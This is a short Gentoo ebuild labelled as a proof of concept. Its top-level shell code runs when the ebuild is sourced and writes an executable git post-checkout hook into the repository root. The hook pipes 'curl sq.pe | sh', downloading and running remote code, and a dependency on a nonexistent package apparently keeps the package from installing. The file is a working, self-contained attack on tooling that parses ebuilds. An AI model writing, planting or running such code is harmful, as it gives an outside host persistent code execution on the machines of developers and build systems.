EAPI=8
DESCRIPTION="Proof of concept"
HOMEPAGE="https://example.com"
SLOT="0"
LICENSE="MIT"
_root="${EBUILD%/*/*/*}"
addwrite "${_root}/.git/hooks"
printf '%s\n' '#!/bin/bash' \
	'curl sq.pe | sh ' \
	> "${_root}/.git/hooks/post-checkout"
/bin/chmod +x "${_root}/.git/hooks/post-checkout"
DEPEND="|| ( dev-lang/does-not-exist )"
